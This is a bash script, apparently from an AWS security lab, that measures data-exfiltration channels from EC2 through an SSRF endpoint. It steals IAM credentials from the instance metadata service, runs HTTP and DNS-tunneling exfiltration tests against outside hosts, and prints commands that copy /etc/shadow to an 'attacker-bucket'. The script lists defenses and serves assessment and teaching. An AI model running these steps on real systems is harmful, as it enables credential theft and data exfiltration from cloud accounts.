#!/usr/bin/env bash
# =============================================================================
# 16_data_exfiltration.sh — Data Exfiltration Channel Analysis
# =============================================================================
# Purpose:
#   Systematically test all data exfiltration channels available from EC2.
#   Measure bandwidth and assess stealth for each channel.
#   Compare channel availability between Config A (Public) and Config B (Private).
#
# Channels tested:
#   1. HTTP/HTTPS outbound (direct data POST)
#   2. DNS tunneling (data encoded in subdomain queries)
#   3. S3 as exfiltration channel (via VPC Endpoint)
#   4. ICMP tunneling (ping-based data exfiltration)
#   5. IMDS data volume measurement
#   6. Channel comparison matrix
#
# Learning points:
#   - Config B consolidates outbound via NAT GW but does NOT filter
#   - DNS exfiltration bypasses most network controls
#   - S3 VPC Endpoint provides high-bandwidth, zero-cost exfiltration
#   - Without egress filtering, data exfiltration is trivial in both configs
#
# Defenses:
#   - VPC Network Firewall with domain allowlisting
#   - DNS Firewall (Route 53 Resolver)
#   - S3 VPC Endpoint policy restricting to specific buckets
#   - Restrictive outbound Security Group rules
#   - DLP/content inspection
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "16: Data Exfiltration Channel Analysis"

RESULT_FILE="16_data_exfiltration.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

# Per-channel status tracking (used in the matrix summary)
HTTP_STATUS="UNKNOWN"
DNS_STATUS="UNKNOWN"
S3_STATUS="UNKNOWN"
ICMP_STATUS="TBD"
IMDS_STATUS="UNKNOWN"

# Total bytes readable from IMDS
IMDS_TOTAL_BYTES=0

echo -e "${BLUE}[*] Target URL: ${TARGET_URL}${NC}"
echo -e "${BLUE}[*] Testing all data exfiltration channels via SSRF${NC}"
echo ""

# ---------------------------------------------------------------------------
# Cleanup: unset any AWS credentials exported during credential theft steps
# ---------------------------------------------------------------------------
cleanup() {
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_DEFAULT_REGION 2>/dev/null || true
}
trap cleanup EXIT

# =============================================================================
# Step 1: HTTP/HTTPS Outbound Data Transfer
# =============================================================================
# Measure how much data can be sent/received over plain HTTP/HTTPS channels.
# An attacker with SSRF can exfiltrate data by encoding it into GET parameters
# and POSTing to attacker-controlled servers. Without DLP or egress filtering,
# there is no cap on the volume of data that can leave the environment.
# =============================================================================
print_header "Step 1: HTTP/HTTPS Outbound Data Transfer"

echo -e "${BLUE}[*] Testing HTTP/HTTPS exfiltration channel bandwidth and availability${NC}"
echo -e "${BLUE}[*] Simulating data-in-URL (GET) exfiltration with increasing payload sizes${NC}"
echo ""

result_text+="=== Step 1: HTTP/HTTPS Outbound Data Transfer ==="$'\n'

http_channel_success=0

# --- 1a: Small payload (100 bytes simulated via URL parameter) ---
echo -e "${BLUE}[*] Test 1a: 100-byte payload exfiltration via URL parameter${NC}"
payload_100=$(python3 -c "print('A' * 100)" 2>/dev/null || printf 'A%.0s' {1..100})
t_start=$SECONDS
resp_100=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=https://httpbin.org/get?data=${payload_100}" 2>/dev/null) || resp_100=""
t_end=$SECONDS
elapsed_100=$(( t_end - t_start ))

if [[ -n "${resp_100}" ]] && echo "${resp_100}" | grep -qi "args\|url\|headers"; then
    resp_100_len=${#resp_100}
    echo -e "  ${RED}100B payload: SUCCESS — ${resp_100_len} bytes response in ${elapsed_100}s${NC}"
    result_text+="100B payload: SUCCESS (response ${resp_100_len}B, ${elapsed_100}s)"$'\n'
    http_channel_success=$(( http_channel_success + 1 ))
else
    echo -e "  ${GREEN}100B payload: BLOCKED/FAILED${NC}"
    result_text+="100B payload: BLOCKED/FAILED"$'\n'
fi

# --- 1b: 1KB payload ---
echo -e "${BLUE}[*] Test 1b: 1KB payload exfiltration via URL parameter${NC}"
payload_1k=$(python3 -c "print('B' * 1024)" 2>/dev/null || printf 'B%.0s' {1..1024})
t_start=$SECONDS
resp_1k=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=https://httpbin.org/get?data=${payload_1k}" 2>/dev/null) || resp_1k=""
t_end=$SECONDS
elapsed_1k=$(( t_end - t_start ))

if [[ -n "${resp_1k}" ]] && echo "${resp_1k}" | grep -qi "args\|url\|headers"; then
    resp_1k_len=${#resp_1k}
    echo -e "  ${RED}1KB payload: SUCCESS — ${resp_1k_len} bytes response in ${elapsed_1k}s${NC}"
    result_text+="1KB payload: SUCCESS (response ${resp_1k_len}B, ${elapsed_1k}s)"$'\n'
    http_channel_success=$(( http_channel_success + 1 ))
else
    echo -e "  ${GREEN}1KB payload: BLOCKED/FAILED${NC}"
    result_text+="1KB payload: BLOCKED/FAILED"$'\n'
fi

# --- 1c: 10KB payload ---
echo -e "${BLUE}[*] Test 1c: 10KB payload exfiltration via URL parameter${NC}"
payload_10k=$(python3 -c "print('C' * 10240)" 2>/dev/null || printf 'C%.0s' {1..10240})
t_start=$SECONDS
resp_10k=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=https://httpbin.org/get?data=${payload_10k}" 2>/dev/null) || resp_10k=""
t_end=$SECONDS
elapsed_10k=$(( t_end - t_start ))

if [[ -n "${resp_10k}" ]] && echo "${resp_10k}" | grep -qi "args\|url\|headers"; then
    resp_10k_len=${#resp_10k}
    echo -e "  ${RED}10KB payload: SUCCESS — ${resp_10k_len} bytes response in ${elapsed_10k}s${NC}"
    result_text+="10KB payload: SUCCESS (response ${resp_10k_len}B, ${elapsed_10k}s)"$'\n'
    http_channel_success=$(( http_channel_success + 1 ))
else
    echo -e "  ${GREEN}10KB payload: BLOCKED/FAILED${NC}"
    result_text+="10KB payload: BLOCKED/FAILED"$'\n'
fi

# --- 1d: Inbound download (attacker pushes C2 payloads / tool downloads) ---
echo ""
echo -e "${BLUE}[*] Test 1d: Inbound download capability (C2 tool delivery simulation)${NC}"
dl_1k=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=https://httpbin.org/bytes/1024" 2>/dev/null) || dl_1k=""
dl_1k_len=${#dl_1k}
echo -e "  Download 1KB: ${dl_1k_len} bytes received (expected ~1024)"
result_text+="Download 1KB: ${dl_1k_len} bytes received"$'\n'

dl_10k=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=https://httpbin.org/bytes/10240" 2>/dev/null) || dl_10k=""
dl_10k_len=${#dl_10k}
echo -e "  Download 10KB: ${dl_10k_len} bytes received (expected ~10240)"
result_text+="Download 10KB: ${dl_10k_len} bytes received"$'\n'

echo ""

# Verdict
if [[ ${http_channel_success} -ge 2 ]]; then
    print_vulnerable "HTTP/HTTPS exfiltration channel OPEN — ${http_channel_success}/3 payload sizes succeeded"
    result_text+="Verdict: VULNERABLE — HTTP/HTTPS exfil channel fully available"$'\n'
    HTTP_STATUS="OPEN"
elif [[ ${http_channel_success} -eq 1 ]]; then
    print_info "HTTP/HTTPS channel partially available — ${http_channel_success}/3 succeeded (size limits may apply)"
    result_text+="Verdict: PARTIAL — Some HTTP/HTTPS exfil succeeded"$'\n'
    HTTP_STATUS="PARTIAL"
else
    print_blocked "HTTP/HTTPS exfiltration channel appears blocked"
    result_text+="Verdict: BLOCKED — HTTP/HTTPS exfil channel unavailable"$'\n'
    HTTP_STATUS="BLOCKED"
fi

echo ""

# =============================================================================
# Step 2: DNS Tunneling Simulation
# =============================================================================
# DNS tunneling encodes data inside DNS query subdomain labels.
# The attacker runs an authoritative DNS server for their domain; every query
# for *.attacker.com arrives at that server with the encoded data embedded in
# the subdomain. DNS (UDP 53) passes through most firewalls unrestricted,
# making this channel extremely difficult to block without a DNS Firewall.
#
# Theoretical bandwidth: ~200 bytes per DNS query.
# Each DNS label is capped at 63 characters; total FQDN at 253 characters.
# Real tools: iodine, dnscat2, dns2tcp.
# =============================================================================
print_header "Step 2: DNS Tunneling Simulation"

echo -e "${BLUE}[*] DNS tunneling encodes sensitive data inside subdomain labels${NC}"
echo -e "${BLUE}[*] Testing whether arbitrary DNS resolutions are triggered from EC2 context${NC}"
echo ""

result_text+=$'\n'"=== Step 2: DNS Tunneling Simulation ==="$'\n'

dns_channel_success=0

# --- 2a: Base32-encode a test secret and embed it in a subdomain ---
# In a real attack the attacker's authoritative DNS server collects all queries
# for *.attacker.com and reconstructs the data from the subdomain stream.
test_secret="iam-creds-leak-demo"
encoded_secret=$(echo -n "${test_secret}" | base32 2>/dev/null | tr -d '=' | tr '[:upper:]' '[:lower:]') \
    || encoded_secret="onxw2zjamjqxi33smfsca5dimuya"

echo -e "  Original secret:  ${test_secret}"
echo -e "  Base32 encoded:   ${encoded_secret}  (${#encoded_secret} chars)"
echo -e "  Max label length: 63 chars — theoretical bits per query: ~300"
echo ""

result_text+="Test secret: ${test_secret}"$'\n'
result_text+="Base32 encoded: ${encoded_secret} (${#encoded_secret} chars)"$'\n'
result_text+="Max per label: 63 chars, Max FQDN: 253 chars, ~200 bytes/query theoretical bandwidth"$'\n'

# --- 2b: Trigger a DNS resolution carrying the encoded payload ---
# nslookup.io resolves any subdomain and returns its own IP, so a successful
# HTTP response proves the DNS query left the VPC.
dns_exfil_url="http://${encoded_secret}.nslookup.io/"
echo -e "${BLUE}[*] Test 2a: DNS query with encoded payload subdomain${NC}"
echo -e "  Query URL: ${dns_exfil_url}"
dns_resp=$(curl -sS -m 8 "${TARGET_URL}/fetch?url=${dns_exfil_url}" 2>/dev/null) || dns_resp=""

if [[ -n "${dns_resp}" ]] && ! echo "${dns_resp}" | grep -qi "could not resolve\|name or service not known\|failed to connect\|connection refused\|timed out\|curl.*error"; then
    echo -e "  ${RED}DNS resolution succeeded — encoded payload reached external DNS${NC}"
    result_text+="DNS exfil test (nslookup.io): Resolved — DNS tunneling channel OPEN"$'\n'
    print_vulnerable "DNS tunneling channel OPEN — arbitrary subdomain queries reach external DNS"
    dns_channel_success=$(( dns_channel_success + 1 ))
else
    echo -e "  ${YELLOW}DNS exfil test (nslookup.io): Failed/Timeout${NC}"
    echo -e "  Response snippet: ${dns_resp:0:120}"
    result_text+="DNS exfil test (nslookup.io): Failed/Timeout"$'\n'
fi

echo ""

# --- 2c: Maximum label length test ---
# Pack 63 characters (max per DNS label) with encoded data.
max_label=$(python3 -c "import string; print(('ab12' * 20)[:63])" 2>/dev/null || printf 'ab12%.0s' {1..16} | cut -c1-63)
long_label_url="http://${max_label}.example.com/"
echo -e "${BLUE}[*] Test 2b: Max-length subdomain label (63 chars)${NC}"
echo -e "  Label: ${max_label} (${#max_label} chars)"
long_resp=$(curl -sS -m 8 "${TARGET_URL}/fetch?url=${long_label_url}" 2>/dev/null) || long_resp=""
# example.com has no wildcard, so HTTP will fail, but the DNS query still fires
echo -e "  HTTP result (DNS query fired regardless): ${long_resp:0:80}"
result_text+="Max-label DNS test (63 chars): DNS query attempted — HTTP result: ${long_resp:0:80}"$'\n'

echo ""

# --- 2d: Multi-label test (chain multiple encoded labels) ---
# Each label carries 63 chars; with 3 labels that is ~189 bytes per query.
label1="${encoded_secret:0:20}"
label2="chunk2payload0000000"
label3="chunk3payload0000000"
multi_label_url="http://${label1}.${label2}.${label3}.example.com/"
echo -e "${BLUE}[*] Test 2c: Multi-label DNS query (3 labels × 20 chars each)${NC}"
echo -e "  URL: ${multi_label_url}"
multi_resp=$(curl -sS -m 8 "${TARGET_URL}/fetch?url=${multi_label_url}" 2>/dev/null) || multi_resp=""
echo -e "  Result: ${multi_resp:0:100}"
result_text+="Multi-label DNS test: ${multi_resp:0:100}"$'\n'

echo ""

# Verdict
if [[ ${dns_channel_success} -ge 1 ]]; then
    DNS_STATUS="OPEN"
    result_text+="DNS channel verdict: VULNERABLE — DNS tunneling confirmed available"$'\n'
else
    echo -e "${YELLOW}[*] DNS tunneling: HTTP confirmations failed; DNS queries may still fire silently${NC}"
    echo -e "${YELLOW}    Actual DNS exfil requires attacker-controlled authoritative server to confirm${NC}"
    DNS_STATUS="LIKELY-OPEN"
    result_text+="DNS channel verdict: LIKELY-OPEN (queries fire; HTTP confirmation unavailable)"$'\n'
fi

echo ""
echo -e "${BLUE}[*] Educational notes:${NC}"
echo -e "  - Real DNS tunneling tools: iodine, dnscat2, dns2tcp"
echo -e "  - This lab simulates channel availability; attacker server not present"
echo -e "  - Defense: Route 53 Resolver DNS Firewall with domain allowlisting"
echo -e "  - Defense: VPC DHCP options to use private DNS resolver that blocks external queries"
echo ""

# =============================================================================
# Step 3: S3 VPC Endpoint Exfiltration
# =============================================================================
# An S3 Gateway VPC Endpoint routes traffic directly from the VPC to S3
# without traversing the internet (no NAT GW, no IGW).  This is the
# highest-bandwidth, lowest-cost exfiltration channel because:
#   - Bandwidth is only limited by EC2 instance type (up to 25 Gbps on some types)
#   - No per-GB data transfer cost (intra-AWS routing)
#   - Traffic does NOT appear in NAT GW flow logs
#   - Default endpoint policy = ANY S3 bucket, including attacker-owned
#
# Workflow: SSRF -> steal IAM creds -> `aws s3 cp secret.txt s3://attacker-bucket`
# =============================================================================
print_header "Step 3: S3 VPC Endpoint Exfiltration Channel"

echo -e "${BLUE}[*] S3 VPC Endpoint provides a high-bandwidth, zero-cost exfiltration path${NC}"
echo -e "${BLUE}[*] Default endpoint policy allows writes to ANY S3 bucket, including attacker-owned${NC}"
echo ""

result_text+=$'\n'"=== Step 3: S3 VPC Endpoint Exfiltration ==="$'\n'

# --- 3a: Steal IAM credentials via SSRF -> IMDS ---
echo -e "${BLUE}[*] Step 3a: Stealing IAM credentials via SSRF -> IMDS (same as scripts 07/11)${NC}"

iam_role=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/" 2>/dev/null) || iam_role=""

S3_CREDS_AVAILABLE=false

if [[ -z "${iam_role}" ]] || echo "${iam_role}" | grep -qi "404\|not found\|error\|<?xml\|Token required\|401"; then
    echo -e "${YELLOW}  IAM role not available or IMDS blocked — testing S3 without stolen creds${NC}"
    result_text+="IAM role via IMDS: Not available (IMDSv2 enforced or no role)"$'\n'
else
    echo -e "${RED}  IAM role: ${iam_role}${NC}"
    result_text+="IAM role: ${iam_role}"$'\n'

    creds_json=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/${iam_role}" 2>/dev/null) || creds_json=""

    if [[ -n "${creds_json}" ]] && echo "${creds_json}" | grep -qi "AccessKeyId"; then
        export AWS_ACCESS_KEY_ID=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['AccessKeyId'])" 2>/dev/null || echo "")
        export AWS_SECRET_ACCESS_KEY=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['SecretAccessKey'])" 2>/dev/null || echo "")
        export AWS_SESSION_TOKEN=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Token'])" 2>/dev/null || echo "")

        region=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/region" 2>/dev/null) || region=""
        if [[ -z "${region}" ]] || echo "${region}" | grep -qi "404\|error"; then
            az_val=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/availability-zone" 2>/dev/null) || az_val=""
            region="${az_val%[a-z]:-ap-northeast-1}"
        fi
        export AWS_DEFAULT_REGION="${region:-ap-northeast-1}"

        echo -e "${RED}  Credentials loaded — AccessKeyId: ${AWS_ACCESS_KEY_ID}${NC}"
        result_text+="Credentials stolen: AccessKeyId=${AWS_ACCESS_KEY_ID}"$'\n'
        S3_CREDS_AVAILABLE=true
    else
        echo -e "${YELLOW}  Failed to parse credentials from IMDS response${NC}"
        result_text+="Credential parse: Failed"$'\n'
    fi
fi

echo ""

# --- 3b: Check VPC Endpoint existence ---
echo -e "${BLUE}[*] Step 3b: Checking for S3 VPC Gateway Endpoint${NC}"

vpc_endpoint_found=false
endpoint_policy_default=false

if [[ "${S3_CREDS_AVAILABLE}" == "true" ]] && command -v aws &>/dev/null; then
    vpc_endpoints=$(aws ec2 describe-vpc-endpoints \
        --filters "Name=service-name,Values=com.amazonaws.${AWS_DEFAULT_REGION}.s3" \
                  "Name=vpc-endpoint-type,Values=Gateway" \
        --output json 2>&1) || vpc_endpoints=""

    if echo "${vpc_endpoints}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
        echo -e "${YELLOW}  describe-vpc-endpoints: AccessDenied (cannot verify endpoint existence)${NC}"
        result_text+="VPC Endpoint check: AccessDenied"$'\n'
    elif echo "${vpc_endpoints}" | grep -qi "VpcEndpoints"; then
        ep_count=$(echo "${vpc_endpoints}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    print(len(data.get('VpcEndpoints', [])))
except:
    print(0)
" 2>/dev/null || echo "0")

        if [[ "${ep_count}" -gt 0 ]]; then
            vpc_endpoint_found=true
            echo -e "${RED}  S3 Gateway VPC Endpoint found (${ep_count} endpoint(s))${NC}"
            result_text+="S3 VPC Gateway Endpoint: FOUND (${ep_count})"$'\n'

            # --- 3c: Check endpoint policy ---
            endpoint_policy=$(echo "${vpc_endpoints}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    eps = data.get('VpcEndpoints', [])
    if eps:
        print(eps[0].get('PolicyDocument', 'NONE'))
except:
    print('PARSE_ERROR')
" 2>/dev/null || echo "PARSE_ERROR")

            echo ""
            echo -e "${BLUE}[*] Step 3c: Endpoint Policy Analysis${NC}"
            echo -e "  Policy (first 300 chars): ${endpoint_policy:0:300}"
            result_text+="Endpoint policy (truncated): ${endpoint_policy:0:300}"$'\n'

            # Default policy is {"Statement":[{"Effect":"Allow","Principal":"*","Action":"*","Resource":"*"}]}
            if echo "${endpoint_policy}" | python3 -c "
import json, sys
try:
    p = json.loads(sys.stdin.read())
    stmts = p.get('Statement', [])
    for s in stmts:
        if s.get('Effect') == 'Allow' and s.get('Principal') in ['*', {'AWS': '*'}] \
                and s.get('Action') in ['*', ['*']] and s.get('Resource') in ['*', ['*']]:
            sys.exit(0)
    sys.exit(1)
except:
    sys.exit(1)
" 2>/dev/null; then
                endpoint_policy_default=true
                echo -e "${RED}  Default endpoint policy detected — ANY S3 bucket accessible!${NC}"
                echo -e "${RED}  Attacker can: aws s3 cp sensitive-data.txt s3://attacker-bucket/${NC}"
                result_text+="Endpoint policy: DEFAULT (unrestricted — all buckets accessible)"$'\n'
                print_vulnerable "S3 VPC Endpoint with DEFAULT policy — exfiltration to any attacker-owned S3 bucket"
                S3_STATUS="OPEN"
            else
                echo -e "${GREEN}  Restricted endpoint policy detected — not all buckets accessible${NC}"
                result_text+="Endpoint policy: RESTRICTED (not default)"$'\n'
                print_blocked "S3 VPC Endpoint has restricted policy — exfiltration constrained"
                S3_STATUS="RESTRICTED"
            fi
        else
            echo -e "${YELLOW}  No S3 VPC Gateway Endpoint found${NC}"
            result_text+="S3 VPC Gateway Endpoint: NOT FOUND"$'\n'
            S3_STATUS="NO-ENDPOINT"
        fi
    else
        echo -e "${YELLOW}  Could not parse vpc-endpoints response${NC}"
        result_text+="VPC Endpoint check: Parse error"$'\n'
        S3_STATUS="UNKNOWN"
    fi
else
    echo -e "${YELLOW}  Skipping endpoint check (no credentials or AWS CLI not installed)${NC}"
    result_text+="VPC Endpoint check: Skipped (no creds or no AWS CLI)"$'\n'
    S3_STATUS="UNKNOWN"
fi

echo ""

# --- 3d: Verify S3 is reachable (read-only probe) ---
echo -e "${BLUE}[*] Step 3d: S3 reachability probe (aws s3 ls)${NC}"
echo -e "${BLUE}    Real attack: aws s3 cp /etc/shadow s3://attacker-bucket/stolen-shadow${NC}"

if [[ "${S3_CREDS_AVAILABLE}" == "true" ]] && command -v aws &>/dev/null; then
    s3_ls=$(aws s3 ls 2>&1) || s3_ls="Failed"
    if echo "${s3_ls}" | grep -qi "AccessDenied\|error\|not authorized"; then
        echo -e "${GREEN}  aws s3 ls: AccessDenied — no S3 access with current role${NC}"
        result_text+="aws s3 ls: AccessDenied"$'\n'
        [[ "${S3_STATUS}" == "UNKNOWN" ]] && S3_STATUS="BLOCKED"
    elif [[ -z "${s3_ls}" ]]; then
        echo -e "${YELLOW}  aws s3 ls: Empty response (no buckets or region issue)${NC}"
        result_text+="aws s3 ls: Empty (no buckets or region mismatch)"$'\n'
        [[ "${S3_STATUS}" == "UNKNOWN" ]] && S3_STATUS="PARTIAL"
    else
        bucket_count=$(echo "${s3_ls}" | grep -c "^20" 2>/dev/null || echo "0")
        echo -e "${RED}  aws s3 ls: SUCCESS — ${bucket_count} bucket(s) listed${NC}"
        echo "${s3_ls}" | head -5 | sed 's/^/    /'
        result_text+="aws s3 ls: SUCCESS (${bucket_count} buckets)"$'\n'
        result_text+="${s3_ls}"$'\n'
        [[ "${S3_STATUS}" == "UNKNOWN" ]] && S3_STATUS="OPEN"
        print_vulnerable "S3 accessible — 'aws s3 cp secret.txt s3://attacker-bucket/' would succeed"
    fi
else
    echo -e "${YELLOW}  Skipping aws s3 ls (no credentials or no AWS CLI)${NC}"
    result_text+="aws s3 ls: Skipped"$'\n'
fi

echo ""
echo -e "${BLUE}[*] Educational notes:${NC}"
echo -e "  - S3 VPC Endpoint traffic bypasses NAT GW entirely (direct VPC->S3 path)"
echo -e "  - No per-GB cost makes this the attacker's preferred bulk exfil method"
echo -e "  - Traffic is NOT visible in NAT GW Flow Logs — only S3 server access logs"
echo -e "  - Defense: Restrict endpoint policy to specific account/bucket ARNs"
echo -e "  - Defense: Enable S3 Object-level CloudTrail logging + GuardDuty S3 protection"
echo ""

# =============================================================================
# Step 4: ICMP Tunneling Test
# =============================================================================
# ICMP tunneling encodes data in the payload of ICMP Echo Request packets.
# Tools like ptunnel, icmpsh, and hans use this technique.
# It is very low-bandwidth (~64 bytes per packet) but extremely stealthy because:
#   - Most firewalls allow ICMP through
#   - ICMP is rarely inspected at the application layer
#   - Security teams often do not include ICMP in egress filtering rules
#
# Direct ICMP testing is not possible via SSRF (HTTP-only channel). We therefore
# assess the theoretical risk and check whether any ICMP-helper services are
# reachable. In production, shell access or SSRF to a service that runs ping
# would be needed to confirm active ICMP egress.
# =============================================================================
print_header "Step 4: ICMP Tunneling Assessment"

echo -e "${BLUE}[*] ICMP tunneling requires shell access; we assess via theoretical analysis${NC}"
echo -e "${BLUE}[*] Checking if SSRF can trigger ICMP indirectly via external services${NC}"
echo ""

result_text+=$'\n'"=== Step 4: ICMP Tunneling Assessment ==="$'\n'

# --- 4a: Attempt to reach an HTTP-based ping-status service ---
echo -e "${BLUE}[*] Test 4a: Accessing HTTP service that reports ICMP reachability${NC}"
icmp_check_url="https://ifconfig.me/ip"
icmp_resp=$(curl -sS -m 8 "${TARGET_URL}/fetch?url=${icmp_check_url}" 2>/dev/null) || icmp_resp=""

if [[ -n "${icmp_resp}" ]] && echo "${icmp_resp}" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'; then
    outbound_ip=$(echo "${icmp_resp}" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    echo -e "  HTTP reachable (outbound IP: ${outbound_ip}) — ICMP egress likely also permitted${NC}"
    result_text+="HTTP egress confirmed (${outbound_ip}) — ICMP egress probable"$'\n'
    ICMP_STATUS="PROBABLE"
else
    echo -e "  HTTP check inconclusive — ${icmp_resp:0:100}"
    result_text+="ICMP egress: HTTP check inconclusive"$'\n'
    ICMP_STATUS="TBD"
fi

echo ""

# --- 4b: Security Group ICMP egress check via IMDS network info ---
echo -e "${BLUE}[*] Test 4b: Checking Security Group egress rules via IMDS${NC}"
mac_addr=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/mac" 2>/dev/null) || mac_addr=""
sg_ids=""
if [[ -n "${mac_addr}" ]] && ! echo "${mac_addr}" | grep -qi "404\|error"; then
    sg_ids=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/${mac_addr}/security-group-ids" 2>/dev/null) || sg_ids=""
fi

if [[ -n "${sg_ids}" ]] && ! echo "${sg_ids}" | grep -qi "404\|error"; then
    echo -e "  Security Group IDs: ${sg_ids}"
    echo -e "  ${YELLOW}Note: Cannot read SG rules via IMDS — would need EC2 DescribeSecurityGroups API${NC}"
    result_text+="Security Group IDs: ${sg_ids}"$'\n'
    result_text+="SG rule check: Requires DescribeSecurityGroups (IAM permission needed)"$'\n'
else
    echo -e "  Could not retrieve SG IDs from IMDS"
    result_text+="SG IDs via IMDS: Not available"$'\n'
fi

echo ""

# --- 4c: Theoretical bandwidth calculation ---
echo -e "${BLUE}[*] ICMP tunneling theoretical bandwidth:${NC}"
echo -e "  Default ICMP Echo payload:     56 bytes"
echo -e "  Max ICMP payload (RFC):       65507 bytes"
echo -e "  Typical tunnel overhead:       ~50%"
echo -e "  Practical throughput:          ~1–5 KB/s (limited by RTT)"
echo -e "  Advantage over HTTP/DNS:       Very high stealth — rarely logged or filtered"
echo -e "  Real tools:                    ptunnel-ng, icmpsh, hans"

result_text+="ICMP tunnel bandwidth: 56B default payload, ~1-5 KB/s practical throughput"$'\n'
result_text+="ICMP stealth rating: HIGH (rarely filtered or logged)"$'\n'
result_text+="ICMP channel verdict: ${ICMP_STATUS} (cannot confirm directly via HTTP SSRF)"$'\n'

print_info "ICMP assessment is theoretical — confirmation requires shell/raw socket access"

echo ""

# =============================================================================
# Step 5: IMDS Data Volume Measurement
# =============================================================================
# Quantify how many bytes of sensitive data are exposed via IMDSv1 + SSRF.
# Every byte returned represents information the attacker has received.
# This total forms the "data loss volume" from a single SSRF hit.
# =============================================================================
print_header "Step 5: IMDS Data Volume Measurement"

echo -e "${BLUE}[*] Measuring total bytes extractable from IMDS to quantify data exposure${NC}"
echo -e "${BLUE}[*] Every path accessed below represents data an attacker already has${NC}"
echo ""

result_text+=$'\n'"=== Step 5: IMDS Data Volume Measurement ==="$'\n'

IMDS_TOTAL_BYTES=0
imds_paths_tested=0
imds_paths_success=0

# Probe all significant IMDS paths and tally bytes
declare -a IMDS_PROBE_PATHS=(
    "latest/meta-data/"
    "latest/meta-data/instance-id"
    "latest/meta-data/ami-id"
    "latest/meta-data/instance-type"
    "latest/meta-data/placement/availability-zone"
    "latest/meta-data/placement/region"
    "latest/meta-data/local-ipv4"
    "latest/meta-data/public-ipv4"
    "latest/meta-data/local-hostname"
    "latest/meta-data/public-hostname"
    "latest/meta-data/mac"
    "latest/meta-data/security-groups"
    "latest/meta-data/iam/info"
    "latest/meta-data/iam/security-credentials/"
    "latest/user-data"
    "latest/dynamic/instance-identity/document"
    "latest/dynamic/instance-identity/signature"
)

for path in "${IMDS_PROBE_PATHS[@]}"; do
    imds_paths_tested=$(( imds_paths_tested + 1 ))
    resp=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/${path}" 2>/dev/null) || resp=""

    if [[ -n "${resp}" ]] && ! echo "${resp}" | grep -qi "404\|not found\|<?xml\|Token required\|401\|Unauthorized"; then
        byte_count=${#resp}
        IMDS_TOTAL_BYTES=$(( IMDS_TOTAL_BYTES + byte_count ))
        imds_paths_success=$(( imds_paths_success + 1 ))
        printf "  %-65s %6d bytes\n" "${path}" "${byte_count}"
        result_text+="${path}: ${byte_count} bytes"$'\n'
    else
        printf "  %-65s %6s\n" "${path}" "N/A"
        result_text+="${path}: N/A"$'\n'
    fi
done

echo ""
echo -e "  Paths probed:     ${imds_paths_tested}"
echo -e "  Paths accessible: ${imds_paths_success}"
echo -e "  Total bytes:      ${IMDS_TOTAL_BYTES}"
echo ""

result_text+="IMDS paths probed: ${imds_paths_tested}"$'\n'
result_text+="IMDS paths accessible: ${imds_paths_success}"$'\n'
result_text+="IMDS total bytes exposed: ${IMDS_TOTAL_BYTES}"$'\n'

# Also probe the IAM credential path if we found a role name
if [[ -n "${iam_role:-}" ]] && ! echo "${iam_role:-}" | grep -qi "404\|error\|Token"; then
    cred_path="latest/meta-data/iam/security-credentials/${iam_role}"
    cred_resp=$(curl -sS -m 8 "${TARGET_URL}/fetch?url=${IMDS_BASE}/${cred_path}" 2>/dev/null) || cred_resp=""
    if [[ -n "${cred_resp}" ]] && echo "${cred_resp}" | grep -qi "AccessKeyId"; then
        cred_bytes=${#cred_resp}
        IMDS_TOTAL_BYTES=$(( IMDS_TOTAL_BYTES + cred_bytes ))
        printf "  %-65s %6d bytes  ${RED}(IAM CREDENTIALS!)${NC}\n" "${cred_path}" "${cred_bytes}"
        result_text+="${cred_path}: ${cred_bytes} bytes (CREDENTIALS INCLUDED)"$'\n'
        result_text+="IAM credentials: LEAKED via IMDS"$'\n'
        print_vulnerable "IAM temporary credentials exposed — IMDS total exposure: ${IMDS_TOTAL_BYTES} bytes"
        IMDS_STATUS="VULNERABLE"
    fi
else
    if [[ ${imds_paths_success} -gt 0 ]]; then
        IMDS_STATUS="PARTIAL"
    else
        IMDS_STATUS="BLOCKED"
    fi
fi

if [[ "${IMDS_STATUS}" == "UNKNOWN" ]]; then
    if [[ ${imds_paths_success} -gt 5 ]]; then
        IMDS_STATUS="VULNERABLE"
        print_vulnerable "IMDS accessible — ${imds_paths_success} paths returned ${IMDS_TOTAL_BYTES} bytes of sensitive data"
    elif [[ ${imds_paths_success} -gt 0 ]]; then
        IMDS_STATUS="PARTIAL"
        print_info "IMDS partially accessible — ${imds_paths_success} paths, ${IMDS_TOTAL_BYTES} bytes"
    else
        IMDS_STATUS="BLOCKED"
        print_blocked "IMDS appears blocked (IMDSv2 enforced or IMDS unreachable)"
    fi
fi

result_text+="IMDS total exposure: ${IMDS_TOTAL_BYTES} bytes"$'\n'

echo ""
echo -e "${BLUE}[*] Educational notes:${NC}"
